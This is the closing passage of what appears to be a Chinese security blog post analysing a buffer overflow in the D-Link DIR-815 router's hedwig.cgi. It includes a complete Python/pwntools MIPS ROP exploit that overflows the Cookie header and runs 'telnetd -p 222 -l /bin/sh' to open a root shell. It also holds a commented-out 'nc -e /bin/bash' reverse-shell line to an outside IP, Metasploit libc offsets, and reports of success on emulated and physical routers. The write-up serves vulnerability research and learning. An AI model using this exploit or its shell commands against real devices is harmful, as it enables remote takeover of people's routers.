        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果：获取shell</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_getshell_sleep.png" alt=""></p>
<h2 id="Firmadyne仿真及实体机测试"><a href="#Firmadyne仿真及实体机测试" class="headerlink" title="Firmadyne仿真及实体机测试"></a>Firmadyne仿真及实体机测试</h2><p>Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/firmadyne.png" alt=""></p>
<p>nmap扫描查看开放的端口，目前3各端口分别对应dns53,http80,upnp49152。</p>
<pre class=" language-sh"><code class="language-sh">Starting Nmap 7.01 ( https://nmap.org ) at 2020-05-24 16:21 CST
Nmap scan report for 192.168.0.1
Host is up (0.00041s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
53/tcp    open  domain  dnsmasq 2.45
80/tcp    open  http    D-Link DIR-815 WAP http config 1.01
49152/tcp open  upnp    D-Link DIR-815 WAP UPnP 1.01 (UPnP 1.0)
MAC Address: 52:54:00:12:34:58 (QEMU virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 1 hop
Service Info: OS: Linux; Device: WAP; CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:linux:linux_kernel, cpe:/h:d-link:dir-815</code></pre>
<p>构造exp进行测试</p>
<p>其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank" rel="noopener">payload</a>写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！</p>
<pre class=" language-sh"><code class="language-sh">[ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
            {
              'Offset'      => 973,
              'LibcBase'    => 0x2aaf8000,    # Router
              #'LibcBase'   => 0x40854000,    # QEMU environment
              'System'      => 0x000531FF,    # address of system
              'CalcSystem'  => 0x000158C8,    # calculate the correct address of system
              'CallSystem'  => 0x000159CC,    # call our system
            }
          ]</code></pre>
<p>下面编写exp进行测试，利用system函数进行测试。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#cmd = "nc -e /bin/bash 192.168.79.145 9999"</span>
    cmd <span class="token operator">=</span> <span class="token string">'telnetd -p 222 -l /bin/sh'</span>
    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x2aaf8000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果显示能够执行<code>telnetd -p 222 -l /bin/sh</code>。telnet 上去对应的窗口直接反弹shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/telnetdp222.png" alt=""></p>
<p>在实体机上刷上1.01的版本，用system方法的exp同样能得到获取shell。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里，终于分析完了，整个过程其实遇到了不少的坑，从最开始死活到不了第二个sprintf，到后面的qemu系统模式如何修改http配置文件都起不来http服务，还有shellcode的修改等等问题都可能卡好久，最后解决的时候才知道并不是太难的问题。。。还是太菜了！我这都是第二次分析了，才能有个大概的了解，想想一年间的自己到底学到了什么。。。整个流程完全自己复现一遍并且能够很清楚的讲出来，其实个人感觉收获还是很多的，比如路由器缓冲区溢出漏洞的分析调试详细流程，gdb、IDA、Ghidra等工具联调使用，以及该libc的万能gadget等等。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.anquanke.com/post/id/179510#h3-8" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>
<p><a href="https://www.anquanke.com/post/id/187443#h2-9" target="_blank" rel="noopener">IOT设备漏洞挖掘从入门到入门（二）- DLink Dir 815漏洞分析及三种方式模拟复现</a></p>
<p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell" target="_blank" rel="noopener">Building MIPS Environment for Router &amp;&amp; PWN</a> </p>
<p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a> </p>
<p><a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">一个mips栈溢出</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://music.163.com/song?id=441532&userid=258169074'></li>
                        
                    
                        
                            <li title='1' data-url='https://link.hhtjim.com/163/26584453.mp3'></li>
                        
                    
                        
                            <li title='2' data-url='https://link.hhtjim.com/163/28245304.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci='177c577b486a2fd2b061'
        data-cs='ce4ec96a3a9f14b35d6e9d750e1d7f231c22db0e'
        data-r='pup2y.github.io'
        data-o='pup2y'
        data-a='pup2y'
        data-d='true'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#00-前言"><span class="toc-number">1.</span> <span class="toc-text">00-前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#01-漏洞介绍"><span class="toc-number">2.</span> <span class="toc-text">01-漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#02-调试环境"><span class="toc-number">3.</span> <span class="toc-text">02-调试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#03-漏洞定位"><span class="toc-number">4.</span> <span class="toc-text">03-漏洞定位</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1漏洞重新定位"><span class="toc-number">4.1.</span> <span class="toc-text">3-1漏洞重新定位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#04-漏洞分析与利用"><span class="toc-number">5.</span> <span class="toc-text">04-漏洞分析与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-漏洞分析"><span class="toc-number">5.1.</span> <span class="toc-text">4.1-漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-漏洞利用"><span class="toc-number">5.2.</span> <span class="toc-text">4.2-漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-劫持PC，确定偏移"><span class="toc-number">5.2.1.</span> <span class="toc-text">4.2.1-劫持PC，确定偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-1-1-重新确定偏移"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">4.2.1.1-重新确定偏移</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2-选择攻击路径构造ROP链"><span class="toc-number">5.2.2.</span> <span class="toc-text">4.2.2-选择攻击路径构造ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-1-通过system函数getshell"><span class="toc-number">5.2.2.1.</span> <span class="toc-text">4.2.2.1-通过system函数getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-2-调用sleep-1-函数"><span class="toc-number">5.2.2.2.</span> <span class="toc-text">4.2.2.2-调用sleep(1)函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#05-qemu系统模式"><span class="toc-number">6.</span> <span class="toc-text">05-qemu系统模式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-环境配置"><span class="toc-number">6.1.</span> <span class="toc-text">5.1-环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-gdbbserver调试"><span class="toc-number">6.2.</span> <span class="toc-text">5.2-gdbbserver调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-编写exp"><span class="toc-number">6.3.</span> <span class="toc-text">5.3-编写exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firmadyne仿真及实体机测试"><span class="toc-number">6.4.</span> <span class="toc-text">Firmadyne仿真及实体机测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"superSample":2,"hOffset":0,"vOffset":-20,"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
        messageStyle: "none"
    });
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>




</html>
